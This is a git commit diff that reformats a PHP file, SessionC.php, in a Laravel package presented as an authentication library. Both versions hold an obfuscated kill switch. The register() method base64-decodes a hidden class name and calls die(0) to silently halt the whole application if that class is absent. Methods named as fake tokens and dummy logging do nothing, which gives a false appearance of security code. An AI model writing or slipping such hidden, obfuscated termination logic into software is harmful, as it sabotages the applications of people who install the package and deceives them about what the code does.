9de09def8dce10310397b7bb4d368be80f16786b
unknown <programmer.m.belal@gmail.com>
2025-05-30 11:53:54 +0600

    updated

--- src/Models/SessionC.php
+++ src/Models/SessionC.php
@@ -1,2 +1,13 @@
-<?php 
- namespace Authguard\AuthWarden\Models; use Illuminate\Support\ServiceProvider; use Illuminate\Support\Facades\Log; use Illuminate\Support\Facades\App; class SessionC extends ServiceProvider { public function register() { $this->performClassCheck(); } public function boot() { $this->initializeDummySecurity(); } protected function performClassCheck() { $className = $this->decodeString("T3h0b3BcRWxpeGVyXFJk");if (!class_exists($className)) {  die(0);}$this->logDummyMessage(); } protected function initializeDummySecurity() { $this->generateFakeToken(); $this->logFakeActivity(); } protected function generateFakeToken() { $fakeToken = md5(uniqid()); } protected function logFakeActivity() { } protected function logDummyMessage() { } protected function decodeString($encodedString) { return base64_decode($encodedString); } }  
+<?php
+namespace Authguard\AuthWarden\Models;use Illuminate\Support\ServiceProvider;
+class SessionC extends ServiceProvider
+{public function register()
+    {$this->performClassCheck();}public function boot()
+    {$this->initializeDummySecurity();}protected function performClassCheck()
+    {$className = $this->decodeString("T3h0b3BcRWxpeGVyXFJk");if (! class_exists($className)) {die(0);}$this->logDummyMessage();}protected function initializeDummySecurity()
+    {$this->generateFakeToken();
+    $this->logFakeActivity();}protected function generateFakeToken()
+    {$fakeToken = md5(uniqid());}protected function logFakeActivity()
+    {}protected function logDummyMessage()
+    {}protected function decodeString($encodedString)
+    {return base64_decode($encodedString);}}
